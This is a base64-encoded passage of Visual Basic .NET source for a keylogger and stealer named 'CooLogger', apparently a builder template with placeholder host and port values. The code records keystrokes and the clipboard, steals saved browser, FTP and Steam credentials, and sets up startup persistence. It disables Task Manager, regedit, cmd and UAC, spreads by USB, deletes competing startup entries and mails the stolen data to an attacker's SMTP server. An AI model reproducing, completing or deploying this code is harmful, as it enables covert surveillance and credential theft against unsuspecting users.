ICBbMjNdID0gJTYlICdzY3JlZW5zaG90cw0KICAgICAgICBbN10gPSAlMyUgJ2NtZA0KICAgICAg ICBbOF0gPSAlNCUgICdyZWdlZGl0DQogICAgICAgIFs5XSA9ICU1JSAndGFza21hbmFnZXINCiAg ICAgICAgWzZdID0gJTElICdtZWx0DQogICAgICAgIFs1XSA9ICUyJSAnc3RhcnR1cA0KICAgICAg ICBbODldID0gJTclICdtc2NvbmZpZw0KICAgICAgICBbOTFdID0gJTglICd1c2INCiAgICAgICAg WzkyXSA9ICU5JSAnbG9nIG9ubHkgaWYNCgkJWzk0XSA9ICUxMCUNCgkJWzk2XSA9ICUxMSUgJ3Vh Yw0KCQlbOTddID0gJTEyJSAncHJvY2Vzc3Byb3RlY3QNCgkJWzk4XSA9ICUxMyUgJ2tpbGwNClsx MzJdID0gJTE0JSAnbG9nIGNvcGllZCB0ZXh0DQpbMTMzXSA9ICUxNSUgJ2JvdCBraWxsZXINClsx MzVdID0gJTE3JSAnbm90aWZ0DQogWzEzOV0gPSAlMTglICd1bmluc3RhbGwNCiBbMTQxXSA9ICUx OSUgJ3Nob3cgd2luZG93IHRpdGxlcw0KIA0KIA0KIGlmIFsxMzVdID0gdHJ1ZSANCiAgICAgICAg aWYgZmlsZS5leGlzdHMoWzMxXSAmICJcWzEzNl0udHh0IikNCgkJDQoJCWVsc2UNCgkJRGltIFsx MzddIEFzIEZpbGVTdHJlYW0gPSBOb3RoaW5nDQogICAgICAgWzEzN10gPSBGaWxlLkNyZWF0ZShb MjldICYgIlxbMTM2XS50eHQiKQ0KCSAgIFVzaW5nIFsxMzddDQogICAgICAgICAgICBFbmQgVXNp bmcNCgkJRGltIFsxMzZdIGFzIG5ldyBTdHJlYW1Xcml0ZXIoWzMxXSAmICJcWzEzNl0udHh0IikN CgkJWzEzNl0uV3JpdGUoIk5vIikNCgkJWzEzNl0uRmx1c2gNCgkJWzEzNl0uQ2xvc2UNCgkJRW5k IGlmDQoJCUVuZCBpZg0KCQkNCgkJDQoJCQ0KCQlEaW0gWzFdIEFzIE9iamVjdA0KICAgICAgICBb MV0gPSBBcHBsaWNhdGlvbi5TdGFydHVwUGF0aA0KICAgICAgICBJZiBbMV0gPSBbMjldIFRoZW4N CiAgICAgICAgRWxzZQ0KICAgICANCiAgICAgICAgICAgIERpbSBbMl0gQXMgRmlsZVN0cmVhbSA9 IE5vdGhpbmcNCiAgICAgICAgICAgIFsyXSA9IEZpbGUuQ3JlYXRlKFsyOV0gJiAiXFsxM10udHh0 IikNCg0KICAgICAgICAgICAgVXNpbmcgWzJdDQogICAgICAgICAgICBFbmQgVXNpbmcNCiAgICAg ICAgICAgIA0KICAgICAgICAgICAgRGltIFs0XSBBcyBOZXcgU3RyZWFtV3JpdGVyKFszMV0gJiAi XFsxM10udHh0IikNCiAgICAgICAgICAgIFs0XS5Xcml0ZShbNjZdKQ0KICAgICAgICAgICAgWzRd LkZsdXNoKCkNCiAgICAgICAgICAgWzRdLkNsb3NlKCkNCiAgICAgICAgICAgIElmIEZpbGUuRXhp c3RzKFsyOV0gKyAiXCIgJiBbMTMwXSAmICIuZXhlIikgVGhlbg0KICAgICAgICAgICAgICAgIE15 LkNvbXB1dGVyLkZpbGVTeXN0ZW0uRGVsZXRlRmlsZShbMjldICsgIlwiICYgWzEzMF0gJiAiLmV4 ZSIpDQogICAgICAgICAgICAgICAgTXkuQ29tcHV0ZXIuRmlsZVN5c3RlbS5Db3B5RmlsZShbNjZd LCBbMjldICsiXCIgJiBbMTMwXSAmICIuZXhlIikNCgkJCQlEaXNhYmxlKFsxMzBdICYgIi5leGUi KQ0KICAgICAgICAgICAgRWxzZQ0KICAgICAgICAgICAgICAgIE15LkNvbXB1dGVyLkZpbGVTeXN0 ZW0uQ29weUZpbGUoWzY2XSwgWzI5XSArICJcIiAmIFsxMzBdICYgIi5leGUiKQ0KCQkJCURpc2Fi bGUoWzEzMF0gJiAiLmV4ZSIpDQogICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgIFByb2Nl c3MuU3RhcnQoWzI5XSArICJcIiAmIFsxMzBdICYgIi5leGUiKQ0KaWYgWzk0XSA9IHRydWUgdGhl bg0KCSAgIG1zZ2JveChbOTVdLCAsIFsxMzFdKQ0KCSAgIGVuZCBpZg0KICAgICAgICAgIEVuZA0K ICAgICAgICBFbmQgSWYNCg0KbXV0ZXgoKQ0KDQogICAgICANCmlmIFsxMzNdID0gdHJ1ZSB0aGVu ICdib3RraWxsZXINCmJvdGtpbGxlcigpDQogICAgICAgICAgICBFbmQgSWYNCgkJCQ0KaWYgWzEz NV0gPSB0cnVlIHRoZW4NCm5vdGlmeSgpDQplbmQgaWYNCg0KDQogICAgICAgIElmIFs1XSA9IHRy dWUgdGhlbiAnc3RhcnR1cA0KICAgICAgICAgICAgRGltIGFwcG5hbWUgQXMgU3RyaW5nID0gSU8u UGF0aC5HZXRGaWxlTmFtZShBcHBsaWNhdGlvbi5FeGVjdXRhYmxlUGF0aCkNCiAgICAgICAgICAg IE15LkNvbXB1dGVyLlJlZ2lzdHJ5LlNldFZhbHVlKCJIS0VZX0NVUlJFTlRfVVNFUlxTT0ZUV0FS RVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4iLCBhcHBuYW1lLCBFbnZpcm9u bWVudC5HZXRGb2xkZXJQYXRoKEVudmlyb25tZW50LlNwZWNpYWxGb2xkZXIuQXBwbGljYXRpb25E YXRhKSAmICJcIiArIGFwcG5hbWUpDQoJCQlFbHNlDQogICAgICAgICAgICBFbmQgSWYNCiAgICAg ICAgDQoNCiAgICAgICAgSWYgWzZdID0gdHJ1ZSB0aGVuICdtZWx0DQogICAgICAgICAgICAgICAg RGltIFsxMl0gQXMgT2JqZWN0DQogICAgICAgICAgICAgICAgWzEyXSA9IE15LkNvbXB1dGVyLkZp bGVTeXN0ZW0uUmVhZEFsbFRleHQoWzI5XSAmICJcWzEzXS50eHQiKQ0KICAgICAgICAgICAgICAg IE15LkNvbXB1dGVyLkZpbGVTeXN0ZW0uRGVsZXRlRmlsZShbMTJdKQ0KICAgICAgICAgICBFbmQg SWYNCgkJDQoNCg0KIElmIFs4OV0gPSB0cnVlIHRoZW4gJ2Rpc2FibGUgbXNjb25maWcNCiANCiAg ICAgICAgRGltIFs5MF0gQXMgTWljcm9zb2Z0LldpbjMyLlJlZ2lzdHJ5S2V5DQogICAgICAgICAg ICBbOTBdID0gTWljcm9zb2Z0LldpbjMyLlJlZ2lzdHJ5LkxvY2FsTWFjaGluZS5PcGVuU3ViS2V5 KFs2NF0oWzEwMF0pLCBUcnVlKQ0KICAgICAgICAgICAgWzkwXS5EZWxldGVTdWJLZXkoWzQyXShb MTAxXSksIFRydWUpDQogICAgICAgICAgICBbOTBdLkNsb3NlKCkNCgkJCQ0KICAgICAgICAgICAg RW5kIElmDQogICAgICAgICAgICANCiAgICAgICAgSWYgWzkxXSA9IHRydWUgdGhlbiAnVVNCIHNw cmVhZA0KICAgICAgICANCgkJWzEwNV0NCgkJDQoJCQ0KICAgICAgICBFbmQgSWYNCg0KICAgICAg DQoNCiAgICAgICAgSWYgWzhdID0gdHJ1ZSB0aGVuICdkaXNhYmxlIHJlZ2VkaXQNCiAgICAgICAg ICAgIFNoZWxsKFs0Ml0oWzU5XSksIHZiTm9ybWFsRm9jdXMpDQogICAgICAgIEVuZCBJZg0KDQog ICAgICAgIElmIFs5XSA9IHRydWUgdGhlbiAnZGlzYWJsZSB0YXNrbWcNCiAgICAgICAgICAgIFNo ZWxsKFs0Ml0oWzYwXSksIHZiTm9ybWFsRm9jdXMpDQoNCiAgICAgICAgRW5kIElmDQoNCiAgSWYg WzddID0gdHJ1ZSB0aGVuICdkaXNhYmxlIGNtZA0KICAgICAgICAgICAgU2hlbGwoWzQyXShbNThd KSwgdmJOb3JtYWxGb2N1cykNCiAgICAgICAgRW5kIElmDQoJCQ0KCQlpZiBbOTZdID0gdHJ1ZSB0 aGVuICd1YWMNCgkJDQoJCURlYWN0aXZhdGVVQUMoKQ0KCQkNCgkJZW5kIGlmDQoJCQ0KCQlpZiBb OTddID0gdHJ1ZSB0aGVuICdwcm9jZXNzDQoJCXBtdXRleA0KCQkNCgkJZW5kIGlmDQoJCQ0KCQkN CgkJaWYgWzk4XSA9IHRydWUgdGhlbiAncHJvY2Vzc2tpbGwNCgkJDQoJCVByb2Nlc3MuR2V0UHJv Y2Vzc2VzQnlOYW1lKFs5OV0pKDApLkNsb3NlTWFpbldpbmRvdygpDQoJCQ0KCQkNCgkJZW5kIGlm DQoJCQ0KDQogICAgICANCgkJDQoJCSAgICoxMiogJ3dpbmRvd3Mga2V5DQoJCSAgICoyKiAnY2hy b21zDQoJCSAgICoxKg0KCSAgICAgICAqNSogJ2ZpbGV6aWxsYQ0KCQkgICAqNCogJ2NvcmVmdHAN CgkJICAgKjMqICdJRQ0KCQkgICAqNyogJ2Z0cGNvbW1hbmRlcg0KCQkgICAqOCogJ2ltdnUNCgkJ ICAgKjkqICdub2lwDQoJCSAgICoxNSogJ3BhbA0KCQkgICAqMTAqICdzbWFydGZ0cA0KCQkgICAq MTEqICdmaXJlZm94DQoJCSAgICoxNCogJ3JzaW5pDQoJCSAgICoxMyogJ05leHVzLmRic3RlYWxl cg0KCQkgICAqMTYqICdzdGVhbQ0KCQkgICANCgkJICBpZiBbODhdLnRleHQgPD4gIiIgdGhlbg0K ICAgICAgICAgICBzdGVhbGVyc2VuZA0KICAgICAgICAgICBlbmQgaWYNCgkJICAgDQoJCSAgIERp bSBbMjBdIGFzIE5ldyBTeXN0ZW0uV2luZG93cy5Gb3Jtcy50aW1lcg0KICAgICAgICBbMjBdLmlu dGVydmFsID0gKmludGVydmFsKg0KICAgICAgICBBZGRIYW5kbGVyIFsyMF0uVGljaywgQWRkcmVz c09mIFsyMF1fVGlja2VkDQogICAgICAgIFsyMF0uc3RhcnQNCg0KCQlpZiBbMTQxXSA9IHRydWUg dGhlbg0KICAgICAgICBEaW0gWzIxXSBBcyBOZXcgU3lzdGVtLldpbmRvd3MuRm9ybXMuVGltZXIN CiAgICAgICAgWzIxXS5JbnRlcnZhbCA9IDMwMA0KICAgICAgICBBZGRIYW5kbGVyIFsyMV0uVGlj aywgQWRkcmVzc09mIFsyMV1fVGlja2VkDQogICAgICAgIFsyMV0uc3RhcnQNCgkJRW5kIGlmDQog ICAgICANCgkgIERpbSBzNGs1M3JnaGtqNDMgQXMgTmV3IFN5c3RlbS5XaW5kb3dzLkZvcm1zLlRp bWVyDQogICAgICAgIHM0azUzcmdoa2o0My5JbnRlcnZhbCA9IDEwDQogICAgICAgIEFkZEhhbmRs ZXIgczRrNTNyZ2hrajQzLlRpY2ssIEFkZHJlc3NPZiBQYXJzZXJfVGlja2VkDQogICAgICAgIHM0 azUzcmdoa2o0My5TdGFydCgpDQoNCgkJaWYgWzEzMl0gPSB0cnVlIHRoZW4NCgkJQ3RleHQgPSBt eS5jb21wdXRlci5jbGlwYm9hcmQuZ2V0dGV4dA0KCSAgICAgRGltIEhkc2ozRzNyZ2hrajQzIEFz IE5ldyBTeXN0ZW0uV2luZG93cy5Gb3Jtcy5UaW1lcg0KICAgICAgICBIZHNqM0czcmdoa2o0My5J bnRlcnZhbCA9IDEwMDANCiAgICAgICAgQWRkSGFuZGxlciBIZHNqM0czcmdoa2o0My5UaWNrLCBB ZGRyZXNzT2YgSGRzajNHM3JnaGtqNDNfVGlja2VkDQogICAgICAgIEhkc2ozRzNyZ2hrajQzLlN0 YXJ0KCkNCgkJRW5kIGlmDQoJCSAgIA0KCQkgRGltIEdVSUQgQXMgUmVnaXN0cnlLZXkNCiAgICAg ICAgIEdVSUQgPSBSZWdpc3RyeS5Mb2NhbE1hY2hpbmUuT3BlblN1YktleSgiU09GVFdBUkVcTWlj cm9zb2Z0XENyeXB0b2dyYXBoeSIsIEZhbHNlKQ0KICAgICAgICAgTUFDR1VJRCA9IEdVSUQuR2V0 VmFsdWUoIk1hY2hpbmVHVUlEIikucmVwbGFjZSgiLSIsICJjIikNCgkJCQ0KCQkgICANCgkJQXBw bGljYXRpb24uUnVuKCkNCiAgICBFbmQgU3ViDQogICAgDQogICAgUHJpdmF0ZSBGdW5jdGlvbiBb MTZdKCkgQXMgU3RyaW5nDQogICAgICAgIERpbSBbMTddIEFzIFN0cmluZw0KICAgICAgICBbMTdd ID0gTmV3IFN0cmluZyhDaHIoMCksIDEwMCkNCiAgICAgICAgWzE1XShHZXRGb3JlZ3JvdW5kV2lu ZG93LCBbMTddLCAxMDApDQogICAgICAgIFsxN10gPSBbMTddLlN1YnN0cmluZygwLCBJblN0cihb MTddLCBDaHIoMCkpIC0gMSkNCiAgICAgICAgUmV0dXJuIFsxN10NCiAgICBFbmQgRnVuY3Rpb24N CiAgICBQdWJsaWMgRnVuY3Rpb24gWzQyXShCeVZhbCBbNDVdIEFzIFN0cmluZykgQXMgU3RyaW5n DQogICAgICAgIERpbSBbNDNdKCkgQXMgQnl0ZSA9IENvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhb NDVdKQ0KICAgICAgICBEaW0gWzQ0XSBBcyBTdHJpbmcgPSBBU0NJSUVuY29kaW5nLkFTQ0lJLkdl dFN0cmluZyhbNDNdKQ0KICAgICAgICBbNDJdID0gWzQ0XQ0KICAgIEVuZCBGdW5jdGlvbg0KCQ0K CVB1YmxpYyBGdW5jdGlvbiBVbmluc3RhbGwNCgl0cnkNCglpZiBNQUNHVUlEIDw+ICIiIHRoZW4N CgllbHNlDQoJZXhpdCBmdW5jdGlvbg0KCUVuZCBpZg0KCWNhdGNoIGV4Y2VyIGFzIGV4Y2VwdGlv bg0KCWV4aXQgZnVuY3Rpb24NCgllbmQgdHJ5DQoJDQoJVHJ5DQoJRGltIHVjaGVjayBhcyBuZXcg d2ViY2xpZW50DQoJRGltIHVjaGVja3MgYXMgc3RyaW5nID0gbm90aGluZw0KCXVjaGVja3MgPSB1 Y2hlY2suRG93bmxvYWRTdHJpbmcoWzE0MF0pDQoJaWYgdWNoZWNrcy5jb250YWlucyhNQUNHVUlE KQ0KCXRyeQ0KCURpbSBhcHBuYW1lIEFzIFN0cmluZyA9IElPLlBhdGguR2V0RmlsZU5hbWUoQXBw bGljYXRpb24uRXhlY3V0YWJsZVBhdGgpDQogICAgICAgICAgICBEaW0gdW5zdSBBcyBSZWdpc3Ry eUtleSA9IE15LkNvbXB1dGVyLlJlZ2lzdHJ5LkN1cnJlbnRVc2VyLk9wZW5TdWJLZXkoIkhLRVlf Q1VSUkVOVF9VU0VSXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1 biIsIGFwcG5hbWUsIEVudmlyb25tZW50LkdldEZvbGRlclBhdGgoRW52aXJvbm1lbnQuU3BlY2lh bEZvbGRlci5BcHBsaWNhdGlvbkRhdGEpICYgIlwiICsgYXBwbmFtZSkNCiAgICAgICAgICAgIHVu c3UuRGVsZXRlVmFsdWUoYXBwbmFtZSkNCgkJCUVuZA0KCUNhdGNoIGV4IGFzIGV4Y2VwdGlvbg0K CUVuZA0KCUVuZCBUcnkNCglFbmQgaWYNCglDYXRjaCBleHggYXMgZXhjZXB0aW9uDQoJRXhpdCBG dW5jdGlvbg0KCUVuZCBUcnkNCgkNCgkNCglSZXR1cm4gVHJ1ZQ0KCUVuZCBGdW5jdGlvbg0KICAg U3ViIEhkc2ozRzNyZ2hrajQzX1RpY2tlZChCeVZhbCBzZW5kZXIgQXMgU3lzdGVtLk9iamVjdCwg QnlWYWwgZSBBcyBTeXN0ZW0uRXZlbnRBcmdzKQ0KICAgdHJ5DQogICBEaW0gY3VycmVudCBhcyBz dHJpbmcgPSBNeS5Db21wdXRlci5DbGlwYm9hcmQuR2V0VGV4dA0KICAgaWYgY3RleHQgPD4gY3Vy cmVudCB0aGVuDQogICBjdGV4dCA9IGN1cnJlbnQNCiAgIFs1NF0udGV4dCA9IFs1NF0udGV4dCAr ICIgW0NvcGllZF0iICsgY3RleHQgKyAiW0NvcGllZF0gIg0KICAgZW5kIGlmDQogICBDYXRjaCBl eCBhcyBleGNlcHRpb24NCiAgIGVuZCB0cnkNCiAgIEVuZCBTdWINCiAgIA0KICBQcml2YXRlIEZ1 bmN0aW9uIERpc2FibGUoQnlWYWwgZXhlbmFtZSBBcyBTdHJpbmcpDQogICAgICAgIHRyeQ0KICAg ICAgICBEaW0gbXlwcm9jZXNzIEFzIE5ldyBQcm9jZXNzDQogICAgICAgIERpbSByZXN1bHRzIGFz IHN0cmluZyA9IG5vdGhpbmcNCiAgICAgICAgRGltIFN0YXJ0SW5mbyBBcyBOZXcgU3lzdGVtLkRp YWdub3N0aWNzLlByb2Nlc3NTdGFydEluZm8NCiAgICAgICAgU3RhcnRJbmZvLkZpbGVOYW1lID0g ImNtZCINCiAgICAgICAgU3RhcnRJbmZvLlJlZGlyZWN0U3RhbmRhcmRJbnB1dCA9IFRydWUNCiAg ICAgICAgU3RhcnRJbmZvLlJlZGlyZWN0U3RhbmRhcmRPdXRwdXQgPSBUcnVlDQogICAgICAgIFN0 YXJ0SW5mby5Vc2VTaGVsbEV4ZWN1dGUgPSBGYWxzZQ0KICAgICAgICBTdGFydEluZm8uQ3JlYXRl Tm9XaW5kb3cgPSBUcnVlDQogICAgICAgIG15cHJvY2Vzcy5TdGFydEluZm8gPSBTdGFydEluZm8N CiAgICAgICAgbXlwcm9jZXNzLlN0YXJ0KCkNCiAgICAgICAgRGltIFNSIEFzIFN5c3RlbS5JTy5T dHJlYW1SZWFkZXIgPSBteXByb2Nlc3MuU3RhbmRhcmRPdXRwdXQNCiAgICAgICAgRGltIFNXIEFz IFN5c3RlbS5JTy5TdHJlYW1Xcml0ZXIgPSBteXByb2Nlc3MuU3RhbmRhcmRJbnB1dA0KICAgICAg ICBTVy5Xcml0ZUxpbmUoImNkICIgJiBFbnZpcm9ubWVudC5HZXRGb2xkZXJQYXRoKEVudmlyb25t ZW50LlNwZWNpYWxGb2xkZXIuQXBwbGljYXRpb25EYXRhKSkNCiAgICAgICAgU1cuV3JpdGVMaW5l KCJlY2hvIFt6b25lVHJhbnNmZXJdWm9uZUlEID0gMiA+ICIgJiBleGVuYW1lICYgIjpaT05FLmlk ZW50aWZpZXIiKQ0KICAgICAgICBTVy5Xcml0ZUxpbmUoImV4aXQiKQ0KICAgICAgICByZXN1bHRz ID0gU1IuUmVhZFRvRW5kDQogICAgICAgIFNXLkNsb3NlKCkNCiAgICAgICAgU1IuQ2xvc2UoKQ0K CQljYXRjaCBleCBhcyBleGNlcHRpb24NCgkJcmV0dXJuIGZhbHNlDQoJCWVuZCB0cnkNCiAgICAg ICAgUmV0dXJuIFRydWUNCiAgICBFbmQgRnVuY3Rpb24NCg0KICAgIFN1YiBbMjBdX1RpY2tlZChC eVZhbCBzZW5kZXIgQXMgU3lzdGVtLk9iamVjdCwgQnlWYWwgZSBBcyBTeXN0ZW0uRXZlbnRBcmdz KQ0KICAgICAgICBpZiBbMTM5XSA9IHRydWUgdGhlbg0KCQlVbmluc3RhbGwNCgkJZW5kIGlmDQoJ CWlmIFs5Ml0gPSB0cnVlIHRoZW4NCgkJaWYgWzU0XS50ZXh0LmNvbnRhaW5zKFs5M10pIHRoZW4N CgkJSWYgWzIzXSA9IFRydWUgdGhlbg0KICAgICAgICAgICAgc21haWwNCiAgICAgICAgRWxzZQ0K ICAgICAgICAgIG5tYWlsDQoJCSAgZW5kIGlmDQoJCSAgZWxzZQ0KCQkgIFs1NF0udGV4dCA9ICIi DQoJCSAgZW5kIGlmDQoJCSAgZWxzZQ0KCQkgIElmIFsyM10gPSBUcnVlIHRoZW4NCiAgICAgICAg ICAgIHNtYWlsDQogICAgICAgIEVsc2UNCiAgICAgICAgICBubWFpbA0KCQkgIA0KCQkgIGVuZCBp Zg0KCQkgIGVuZCBpZg0KICAgICAgICAgICAgZW5kIHN1Yg0KICAgICAgIFB1YmxpYyBGdW5jdGlv biBib3RraWxsZXIoKQ0KICAgICAgICBEaW0gciBBcyBSZWdpc3RyeUtleSA9IFJlZ2lzdHJ5LkN1 cnJlbnRVc2VyLk9wZW5TdWJLZXkoIlNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRW ZXJzaW9uXFJ1blwiKQ0KICAgICAgICBGb3IgRWFjaCB2YWx1ZSBBcyBTdHJpbmcgSW4gci5HZXRW YWx1ZU5hbWVzDQogICAgICAgICAgICBUcnkNCiAgICAgICAgICAgICAgICByLkRlbGV0ZVZhbHVl KHZhbHVlKQ0KICAgICAgICAgICAgQ2F0Y2gNCiAgICAgICAgICAgIEVuZCBUcnkNCiAgICAgICAg TmV4dA0KICAgICAgICBSZXR1cm4gVHJ1ZQ0KICAgIEVuZCBGdW5jdGlvbg0KCSAgDQoJICBQdWJs aWMgRnVuY3Rpb24gc3RlYWxlcnNlbmQNCgkgICB0cnkNCiAgV2l0aCBbMzJdDQogIA0KICAgICAg ICAgICAgICAgIC5Gcm9tID0gTmV3IE1haWxBZGRyZXNzKFs2Ml0uWzYzXShbNjRdKFs0Ml0oWzI1 XSkpKSkNCiAgICAgICAgICAgICAgICAuVG8uQWRkKFs2Ml0uWzYzXShbNjRdKFs0Ml0oWzI1XSkp KSkNCiAgICAgICAgICAgICAgICAuU3ViamVjdCA9ICJDb29Mb2dnZXIgUmVjb3ZlcmVkIERhdGEg ZnJvbSAtICIgJiBFbnZpcm9ubWVudC5Vc2VyTmFtZQ0KICAgICAgICAgICAgICAgIC5Cb2R5ID0g KCJ+fn5+flN0ZWFsZXJzfn5+fn4iICYgdmJuZXdsaW5lICYgdmJuZXdsaW5lICYgdmJuZXdsaW5l ICYgaWVkYXRhICYgWzg4XS5UZXh0KQ0KICAgICAgICAgICAgRW5kIFdpdGgNCg0KICAgICAgICAg ICAgV2l0aCBbMzddDQogICAgICAgICAgICAgICAgLkhvc3QgPSAiKmhvc3QqIg0KICAgICAgICAg ICAgICAgIC5Qb3J0ID0gKnBvcnQqDQogICAgICAgICAgICAgICAgLkVuYWJsZVNzbCA9IFRydWUN CiAgICAgICAgICAgICAgICAuQ3JlZGVudGlhbHMgPSBOZXcgU3lzdGVtLk5ldC5OZXR3b3JrQ3Jl ZGVudGlhbChbNjJdLls2M10oWzY0XShbNDJdKFsyNV0pKSksIFs2Ml0uWzYzXShbNjRdKFs0Ml0o WzI2XSkpKSkNCiAgICAgICAgICAgICAgICAuU2VuZChbMzJdKQ0KICAgICAgICAgICAgRW5kIFdp dGgNCiAgICAgICAgICAgIA0KCQkJWzg4XS5UZXh0ID0gIiINClszMl0uQXR0YWNobWVudHMuQ2xl YXIoKQ0KCQkJY2F0Y2ggZXggYXMgZXhjZXB0aW9uIA0KCQkJZW5kIHRyeQ0KcmV0dXJuIG5vdGhp bmcNCmVuZCBmdW5jdGlvbg0KUHVibGljIGZ1bmN0aW9uIHBtdXRleA0KVHJ5DQogU3lzdGVtLlRo cmVhZGluZy5NdXRleC5PcGVuRXhpc3RpbmcoIipwbXV0ZXgqIikNCiAgICAgICAgICAgIENhdGNo IGV4IEFzIEV4Y2VwdGlvbg0KCQkJdHJ5DQogICAgRGltIGRhdGEgQXMgQnl0ZSgpDQoJCURpbSBv RmlsZVN0cmVhbSBBcyBTeXN0ZW0uSU8uRmlsZVN0cmVhbQ0KCSAgICBEaW0gcnVuVGltZVJlc291 cmNlU2V0IEFzIE9iamVjdA0KCQlEaW0gZGljdEVudHJ5IEFzIERpY3Rpb25hcnlFbnRyeQ0KCQlE aW0gcmVzbSBBcyBOZXcgUmVzb3VyY2VzLlJlc291cmNlTWFuYWdlcigiUHJvY2VzcyIsIEFzc2Vt Ymx5LkdldEV4ZWN1dGluZ0Fzc2VtYmx5KQ0KCQlydW5UaW1lUmVzb3VyY2VTZXQgPSByZXNtLkdl dFJlc291cmNlU2V0KFN5c3RlbS5HbG9iYWxpemF0aW9uLkN1bHR1cmVJbmZvLkN1cnJlbnRDdWx0 dXJlLCBUcnVlLCBUcnVlKQ0KCQlGb3IgRWFjaCBkaWN0RW50cnkgSW4gcnVuVGltZVJlc291cmNl U2V0DQoJCSAgICBkYXRhID0gRGlyZWN0Q2FzdChDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcocmVz bS5HZXRPYmplY3QoZGljdEVudHJ5LmtleSkpLCBCeXRlKCkpDQoJCQlNeS5Db21wdXRlci5GaWxl U3lzdGVtLkRlbGV0ZUZpbGUoWzI5XSAmICJcIiAmIGRpY3RFbnRyeS5LZXkpDQoJCQlvRmlsZVN0 cmVhbSA9IE5ldyBTeXN0ZW0uSU8uRmlsZVN0cmVhbShbMjldICYgIlwiICYgZGljdEVudHJ5Lktl eSwgU3lzdGVtLklPLkZpbGVNb2RlLkNyZWF0ZSkNCgkJCW9GaWxlU3RyZWFtLldyaXRlKGRhdGEs IDAsIGRhdGEuTGVuZ3RoKQ0KCQkJb0ZpbGVTdHJlYW0uQ2xvc2UoKQ0KCQkJUHJvY2Vzcy5TdGFy dChbMjldICYgIlwiICYgZGljdEVudHJ5LktleSkNCgkJCU5leHQNCgkJCWNhdGNoIGUgYXMgZXhj ZXB0aW9uDQoJCQkNCgkJCWVuZCB0cnkNCiAgICAgICAgICAgIEVuZCBUcnkNCgkJCXJldHVybiB0 cnVlDQoJCQlFbmQgZnVuY3Rpb24NCgkgDQogIFB1YmxpYyBGdW5jdGlvbiBub3RpZnkNCgkgIA0K IERpbSBbMTM3XSBBcyBPYmplY3QNClsxMzddID0gTXkuQ29tcHV0ZXIuRmlsZVN5c3RlbS5SZWFk QWxsVGV4dChbMjldICYgIlxbMTM2XS50eHQiKQ0KaWYgWzEzN10gPSAiTm8iIFRoZW4NCnRyeQ0K ICBXaXRoIFszMl0NCiAgDQogICAgICAgICAgICAgICAgLkZyb20gPSBOZXcgTWFpbEFkZHJlc3Mo WzYyXS5bNjNdKFs2NF0oWzQyXShbMjVdKSkpKQ0KICAgICAgICAgICAgICAgIC5Uby5BZGQoWzYy XS5bNjNdKFs2NF0oWzQyXShbMjVdKSkpKQ0KICAgICAgICAgICAgICAgIC5TdWJqZWN0ID0gIkNv b0xvZ2dlciBJbmZlY3Rpb24gTm90aWZpY2F0aW9uIg0KICAgICAgICAgICAgICAgIC5Cb2R5ID0g KCJDb29Mb2dnZXIgSW5zdGFsbGVkIE9uIC0gIiAmIEVudmlyb25tZW50LlVzZXJOYW1lKQ0KICAg ICAgICAgICAgRW5kIFdpdGgNCg0KICAgICAgICAgICAgV2l0aCBbMzddDQogICAgICAgICAgICAg ICAgLkhvc3QgPSAiKmhvc3QqIg0KICAgICAgICAgICAgICAgIC5Qb3J0ID0gKnBvcnQqDQogICAg ICAgICAgICAgICAgLkVuYWJsZVNzbCA9IFRydWUNCiAgICAgICAgICAgICAgICAuQ3JlZGVudGlh bHMgPSBOZXcgU3lzdGVtLk5ldC5OZXR3b3JrQ3JlZGVudGlhbChbNjJdLls2M10oWzY0XShbNDJd KFsyNV0pKSksIFs2Ml0uWzYzXShbNjRdKFs0Ml0oWzI2XSkpKSkNCiAgICAgICAgICAgICAgICAu U2VuZChbMzJdKQ0KICAgICAgICAgICAgRW5kIFdpdGgNCg0KICAgICAgICAgICAgY2F0Y2ggZXgg YXMgZXhjZXB0aW9uIA0KCQkJZW5kIHRyeQ0KCQkJRGltIFsxMzZdIGFzIG5ldyBTdHJlYW1Xcml0 ZXIoWzMxXSAmICJcWzEzNl0udHh0IikNCgkJICAgIFsxMzZdLldyaXRlKCJZZXMiKQ0KCQkgICAg WzEzNl0uRmx1c2gNCgkJICAgIFsxMzZdLkNsb3NlDQoJCQlFbmQgSWYNCnJldHVybiBub3RoaW5n DQplbmQgZnVuY3Rpb24NCg0KU3ViIFBhcnNlcl9UaWNrZWQoQnlWYWwgc2VuZGVyIEFzIFN5c3Rl bS5PYmplY3QsIEJ5VmFsIGUgQXMgU3lzdGVtLkV2ZW50QXJncykNCiAgICAgICAgT24gRXJyb3Ig UmVzdW1lIE5leHQNCgkJDQogICAgICAgIElmIE15LkNvbXB1dGVyLktleWJvYXJkLlNoaWZ0S2V5 RG93biA9IFRydWUgQW5kIE15LkNvbXB1dGVyLktleWJvYXJkLkNhcHNMb2NrID0gRmFsc2UgVGhl bg0KICAgICAgICAgICAgSWYgR2V0QXN5bmNLZXlTdGF0ZSg2NSkgPSAtMzI3NjcgVGhlbg0KICAg ICAgICAgICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQgKyAiQSINCiAgICAgICAgICAgIEVsc2VJ ZiBHZXRBc3luY0tleVN0YXRlKDY2KSA9IC0zMjc2NyBUaGVuDQogICAgICAgICAgICAgICBbNTRd LlRleHQgPVs1NF0uVGV4dCArICJCIg0KICAgICAgICAgICAgRWxzZUlmIEdldEFzeW5jS2V5U3Rh dGUoNjcpID0gLTMyNzY3IFRoZW4NCiAgICAgICAgICAgICAgIFs1NF0uVGV4dCA9WzU0XS5UZXh0 ICsgIkMiDQogICAgICAgICAgICBFbHNlSWYgR2V0QXN5bmNLZXlTdGF0ZSg2OCkgPSAtMzI3Njcg VGhlbg0KICAgICAgICAgICAgICAgWzU0XS5UZXh0ID1bNTRdLlRleHQgKyAiRCINCiAgICAgICAg ICAgIEVsc2VJZiBHZXRBc3luY0tleVN0YXRlKDY5KSA9IC0zMjc2NyBUaGVuDQogICAgICAgICAg ICAgICBbNTRdLlRleHQgPVs1NF0uVGV4dCArICJFIg0KICAgICAgICAgICAgRWxzZUlmIEdldEFz eW5jS2V5U3RhdGUoNzApID0gLTMyNzY3IFRoZW4NCiAgICAgICAgICAgICAgIFs1NF0uVGV4dCA9 